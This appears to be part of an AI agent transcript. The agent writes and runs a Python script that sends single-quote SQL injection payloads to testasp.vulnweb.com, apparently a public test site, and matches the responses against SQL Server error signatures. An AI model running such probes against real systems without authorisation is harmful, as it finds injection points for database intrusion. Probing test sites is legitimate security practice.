deepseek-v4.1-flash.content: I'll start with a **baseline vs. single-quote probe** — the cheapest way to detect SQL injection: fetch `id=1` (normal), then `id=1'` (syntactically broken) and diff status/length/error signatures.

function.arguments:
{"cmd": "$py = @'
import urllib.request, urllib.error, re, hashlib

BASE = "http://testasp.vulnweb.com/showforum.asp?id="
SIGS = [
    "Microsoft OLE DB Provider for SQL Server",
    "ODBC SQL Server Driver",
    "Unclosed quotation mark",
    "Incorrect syntax near",
    "ADODB.Field",
    "ADODB.Command",
    "80040e14",
    "80040e07",
    "Syntax error",
    "SQLServer",
    "System.Data.SqlClient",
]

def fetch(q):
    url = BASE + q
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (sqli-probe)"})
    try:
        r = urllib.request.urlopen(req, timeout=25)
        body = r.read()
        return r.getcode(), body, None
    except urllib.error.HTTPError as e:
        return e.code, e.read(), "HTTPError"
    except Exception as e:
        return None, b"", repr(e)

for label, q in [("BASELINE", "1"), ("QUOTE", "1%27"), ("QUOTE2", "1%27%27")]:
    code, body, err = fetch(q)
    text = body.decode("utf-8", "replace")
    hits = [s for s in SIGS if s.lower() in text.lower()]
    print("=" * 60)
    print(f"[{label}] payload={q}")
    print(f"  status   : {code}   err={err}")
    print(f"  bytes    : {len(body)}   md5={hashlib.md5(body).hexdigest()}")
    print(f"  sigs     : {hits if hits else 'none'}")
    m = re.search(r"(error[^<]{0,120})", text, re.I)
    if m:
        print(f"  snippet  : {m.group(1).strip()[:160]}")
'@
Set-Content -Path .\sqli_probe1.py -Value $py -Encoding ASCII
python .\sqli_probe1.py"}
